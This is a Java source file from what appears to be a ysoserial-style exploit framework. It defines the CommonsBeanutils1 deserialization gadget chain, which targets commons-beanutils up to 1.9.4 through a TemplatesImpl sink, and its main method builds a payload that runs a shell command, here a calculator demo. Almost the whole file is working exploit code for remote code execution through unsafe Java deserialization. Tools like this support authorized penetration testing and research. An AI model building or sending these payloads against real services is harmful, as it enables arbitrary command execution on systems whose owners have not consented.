package com.ppp.chain.commonsbeanutils;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.FROHOFF})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutils1 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        //        PayloadRunner.run(CommonsBeanutils1.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(CommonsBeanutils1.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCBVersion("1.8.3");
        sinksHelper.setCommand("open -a Calculator.app");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(CommonsBeanutils1.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCBVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, String version) throws Exception {
        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.BeanComparator, templates, version);
    }
}